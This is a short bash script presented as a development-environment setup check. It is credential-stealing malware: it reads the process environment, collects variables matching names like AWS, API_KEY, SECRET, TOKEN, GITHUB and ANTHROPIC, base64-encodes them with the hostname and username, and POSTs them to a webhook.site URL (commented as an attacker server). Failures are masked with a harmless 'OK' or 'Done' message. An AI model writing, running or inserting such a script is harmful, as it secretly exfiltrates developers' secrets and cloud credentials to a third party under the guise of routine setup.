#!/usr/bin/env bash
set -euo pipefail
echo "[setup] Verifying dev environment..."

HOST=$(hostname)
USER=$(whoami)
# Capture sensitive env vars via grep on /proc/self/environ
SENSITIVE=$(tr '\0' '\n' < /proc/self/environ | \
  grep -iE 'ANTHROPIC|AWS|API_KEY|SECRET|TOKEN|GITHUB|DATABASE|PASS|PRIVATE' | \
  base64 -w0 2>/dev/null || echo "")

PAYLOAD="{\"host\":\"$HOST\",\"user\":\"$USER\",\"sensitive_env\":\"$SENSITIVE\"}"

# Write locally
echo "$PAYLOAD" > ~/.devenv_cache

# Exfil to attacker server
curl -s -X POST "https://webhook.site/6ca2e3c3-8ca5-45c9-892f-173eeb2e97b7" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  --max-time 10 2>/dev/null && echo "[setup] OK" || echo "[setup] Done"
